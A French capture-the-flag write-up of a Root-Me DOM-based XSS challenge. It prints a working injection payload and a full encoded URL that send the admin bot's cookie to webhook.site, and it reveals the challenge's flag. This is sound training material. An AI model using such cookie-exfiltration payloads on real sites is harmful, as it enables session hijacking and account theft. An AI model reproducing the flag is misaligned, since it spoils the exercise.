# XSS DOM Based - Introduction — Root-Me Web Client

**Points :** 10 | **Difficulté :** Facile | **Catégorie :** XSS/DOM | **Date :** 2026-03-01

## Énoncé
Introduction aux XSS basées sur le DOM. Exploiter une vulnérabilité XSS pour voler le cookie d'un bot admin.

**URL :** http://challenge01.root-me.org/web-client/ch32/

## Analyse
La page contient un formulaire "lucky number" qui prend un paramètre `number` via GET.

```html
<form action="" method="get" name="form">
    <input type="text" id="number" name="number" placeholder="Number">
    <input type="submit" value="Submit">
</form>
<div id="state"></div>
```

Le JavaScript récupère le paramètre et l'insère directement dans le code :

```javascript
<script>
var random = Math.random() * (99);
var number = '42';  // ← valeur du paramètre ?number=42
if(random == number) {
    document.getElementById('state').innerHTML = 'You won...';
}
else{
    document.getElementById('state').innerText = 'Sorry, wrong answer ! The right answer was ' + random;
}
</script>
```

**Vulnérabilité** : la valeur de `number` est directement injectée dans le code JS sans sanitisation → **DOM-based XSS**.

## Exploitation
### Payload XSS
En injectant dans le paramètre `number` :
```
';new Image().src='https://webhook.site/XXX?c='+encodeURIComponent(document.cookie);//
```

Le code devient :
```javascript
var number = '';new Image().src='https://webhook.site/XXX?c='+encodeURIComponent(document.cookie);//';
```

Le `;//` commente la fin de la ligne, évitant les erreurs JS.

### Exfiltration du cookie
1. Créer un endpoint webhook : https://webhook.site (obtenir un UUID unique)
2. Construire l'URL malveillante :
```
http://challenge01.root-me.org/web-client/ch32/index.php?number='%3Bnew%20Image().src%3D'https%3A%2F%2Fwebhook.site%2FUUID%3Fc%3D'%2BencodeURIComponent(document.cookie)%3B%2F%2F
```

3. Soumettre l'URL au bot admin via `contact.php` :
   - Aller sur http://challenge01.root-me.org/web-client/ch32/contact.php
   - Entrer l'URL malveillante
   - Le bot visite l'URL et son cookie est exfiltré vers le webhook

4. Récupérer le flag dans les requêtes du webhook :
```
GET /?c=flag%3Drootme%7BXSS_D0M_BaSed_InTr0%7D
Cookie: flag=rootme{XSS_D0M_BaSed_InTr0}
```

## Flag
`rootme{XSS_D0M_BaSed_InTr0}`

## Technique apprise
- **XSS DOM-based** : vulnérabilité côté client où le payload est exécuté par manipulation du DOM (pas de réponse serveur modifiée)
- **Cookie exfiltration** : utiliser `new Image().src` pour envoyer des données vers un serveur contrôlé sans bloquer le JS
- **Bot submission** : certains challenges XSS nécessitent de soumettre une URL à un bot admin qui visite la page avec ses cookies privilégiés
- **Webhook.site** : service pratique pour capturer des requêtes HTTP lors de tests d'exfiltration
- **URL encoding** : toujours encoder les paramètres d'URL pour éviter que les caractères spéciaux cassent la requête
